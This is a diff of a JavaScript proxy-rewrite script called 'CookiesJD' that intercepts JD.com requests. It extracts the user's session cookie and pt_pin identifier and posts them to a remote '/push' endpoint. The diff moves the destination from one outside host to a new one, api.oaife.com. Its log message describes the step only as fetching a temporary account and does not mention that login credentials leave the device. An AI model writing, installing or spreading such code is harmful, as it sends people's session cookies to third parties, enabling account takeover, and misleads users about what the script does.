@@ -34,6 +34,7 @@ const APIKey = 'CookiesJD';
 const $ = new API(APIKey, true);
 const CacheKey = `#${APIKey}`;
 const mute = '#cks_get_mute';
+const host = "https://api.oaife.com"
 $.mute = $.read(mute);
 console.log("正在获取临时账号...");
 if ($request) GetCookie();
@@ -55,7 +56,7 @@ function GetCookie() {
                 var pt_pin = CV.match(/pt_pin=.+?;/)
                 var pin = "pin=" + pt_pin.toString().split('=')[1] //jd_1r0coanr54kl0
                 let data = {"source": "wx_app", "type": "temp", "value": CookieValue, "pin": pin}
-                const opt = {url: "http://api.bilin.eu.org/push", body: JSON.stringify(data)};
+                const opt = {url: `${host}/push`, body: JSON.stringify(data)};
                 $.http.post(opt).then((response) => JSON.parse(response.body));
             }
         } else {
